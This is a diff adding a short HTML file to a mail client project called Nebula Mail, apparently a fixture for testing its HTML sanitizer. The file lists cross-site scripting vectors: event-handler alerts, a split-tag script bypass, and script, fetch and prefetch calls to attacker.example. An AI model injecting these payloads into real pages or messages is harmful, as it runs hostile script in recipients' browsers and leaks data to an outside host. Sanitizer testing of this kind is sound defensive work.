@@ -1,0 +1,16 @@
+<!-- SPDX-FileCopyrightText: 2026 Nebula Mail contributors -->
+<!-- SPDX-License-Identifier: AGPL-3.0-only -->
+<html><head><script>document.write('x')</script><script src="https://attacker.example/s.js"></script></head>
+<body onload="fetch('https://attacker.example/onload')">
+<p>Scripts</p>
+<img src="x" onerror="fetch('https://attacker.example/onerror')">
+<img src="https://cdn.example/ok.png" width="100" height="100" onload="alert(1)">
+<div onmouseover="alert(1)">hover</div>
+<details open ontoggle="alert(1)"><summary>toggle</summary></details>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script type="speculationrules">{"prefetch":[{"source":"list","urls":["https://attacker.example/prefetch"]}]}</script>
+<video><source onerror="alert(1)"></video>
+<marquee onstart="alert(1)">m</marquee>
+<a href="https://ok.example/" onclick="alert(1)">link</a>
+<p style="color:red" onpointerenter="alert(1)">styled</p>
+</body></html>
